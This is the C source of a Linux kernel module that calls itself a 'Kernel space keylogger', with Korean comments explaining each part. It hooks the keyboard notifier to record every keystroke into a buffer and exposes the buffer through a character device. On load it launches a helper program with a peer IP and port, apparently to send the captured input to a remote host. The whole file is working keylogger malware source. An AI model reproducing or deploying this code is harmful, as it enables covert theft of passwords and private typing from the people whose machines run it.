/* Necessary includes for device drivers */
#include <linux/kernel.h>
#include <asm/uaccess.h>
#include <linux/kmod.h>

#include "klogger.h"

static int shiftkey_On = 0;

static int start_echo(void)
{
    char *argv[] = {ECHO_SERVER, PEER_IP, PORT, NULL};
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };

    return call_usermodehelper( argv[0], argv, envp, UMH_WAIT_EXEC );
}

int klg_init(void) {
    int result;

    /* Registering device */
    result = register_chrdev(KLG_MAJOR, "klg", &klg_fops);
    /*
     * register_chrdev() : 문자장치를 관리하는 chrdev[] 구조체에서 배열을 할당받음.
     * KLG_MAJOR : 배열 chrdev[]의 순서를 결정하는 major 번호
     * "klg" : 등록될 문자 장치
     * &klg_fops : 파일 오퍼레이션을 위한 함수 포인터 
     */
  
    if (result < 0)// 할당 실패시.
        return result;

    register_keyboard_notifier(&nb);
    //keyboard notifier function을 시작.
    memset(buffer, 0, sizeof buffer);
    //buffer를 0으로 초기화.

    printk(KERN_DEBUG "[Key logger]: Inserting klg module\n"); 
    //커널 메세지 출력 

    return start_echo();
    // return 0;
}

void klg_exit(void) {
    /* Freeing the major number */
    unregister_chrdev(KLG_MAJOR, "klg");
    //등록된 장치 제거.
    unregister_keyboard_notifier(&nb);
    //keyboard notifier function 종료 
    memset(buffer, 0, sizeof buffer);
    //buffer 초기화 
    bptr = buffer;
    //bptr을 buffer로 다시 지정.
    printk(KERN_DEBUG "[Key logger]: Removing klg module\n");

}

// 참조 http://www.makelinux.net/ldd3/images/0596005903/figs/ldr3_0302.gif
int klg_open(struct inode *inode, struct file *filp) {  // kernel 프로그래밍 시 필요한 .open 에 할당될 함수로 로그만 남기고 아무것도 안함

    printk(KERN_DEBUG "[Key logger]: Opening device\n");    // 커널 로그 남김
    return 0;
}

ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) { // kernel 프로그래밍 시 필요한 .read 에 할당 될 함수

    printk(KERN_DEBUG "[Key logger]: Reading /dev/klg\n");  // 커널 로그 생성

    char* p = buffer;
    int bytes = 0;

    while(*p != '\0') { // 버퍼 크기 조사하는 함수로 보임
        bytes++;
        p++;
    }

    printk(KERN_DEBUG "[Key logger]: Reading %d bytes\n", bytes);   // 커널 로그 생성

    if(bytes == 0 || *f_pos) return 0;  // 버퍼 크기가 0일 경우 0 반환

    int ret = copy_to_user(buf, buffer, bytes); // buf 유저에게 buffer 를 bytes 값만큼 보냄

    if(ret) {   // 실패시
        printk(KERN_DEBUG "[Key logger]: Can't copy to user space buffer\n");   // 로그 찍기
        return -EFAULT; // #define EFAULT  14  /* Bad address */   from error.h
    }

    *f_pos = 1;

    return bytes;
}

int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
    struct keyboard_notifier_param *param = _param; //사용자가 입력한 문자를 저장함
    int i;
    char caps[] = { '[','c','a','p','s',' ','l','o','c','k',']'};
    if (code == KBD_KEYCODE)
    {
        if (param->value == 42 || param->value == 54)
        {
            if(param->down) shiftkey_On = 1;
            else shiftkey_On = 0;
            return NOTIFY_OK;
        }
        if (param->down)
        {
            if (param->value == KEY_BACKSPACE)  //백스페이스 눌렀을 때
            { 
                *bptr = '\\' ;
                bptr++;
				if (bptr == endptr) bptr = buffer;
                *bptr = 'r' ;
                bptr++;
                if (bptr == endptr) bptr = buffer;
            }
            else if (param->value == KEY_TAB)  //탭키 눌렀을 때
            {
                *bptr = '\\';
                bptr++;
				if (bptr == endptr) bptr = buffer;
                *bptr = 't';
                bptr++;
                if (bptr == endptr) bptr = buffer;
            }
            else if (param->value == KEY_CAPSLOCK)  //캡스락 눌렀을 때
            {
                for (i = 0; i <11; i++) {
                    *bptr = caps[i];
                    bptr++;
                    if (bptr == endptr) bptr = buffer;
                }
            }
            else 
            {
                char ch;
                if(shiftkey_On == 0)
                    ch = get_ascii(param->value); //아스키코드로 변환
                else
                    ch = shifted_get_ascii(param->value);  //shift 아스키코드로 변환
                if (ch != 'X') {  //X아니면
                    *bptr = ch;  //bptr에 저장하고
                    bptr++;  //주소1증가
                    if (bptr == endptr) bptr = buffer;  //버퍼의 끝에 다다르면 처음으로 초기화
                }
            }
        }
    }
    return NOTIFY_OK;
}

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Aisha Nair");   
MODULE_DESCRIPTION("Kernel space keylogger");  
MODULE_VERSION("2.0"); 

module_init(klg_init);
module_exit(klg_exit);

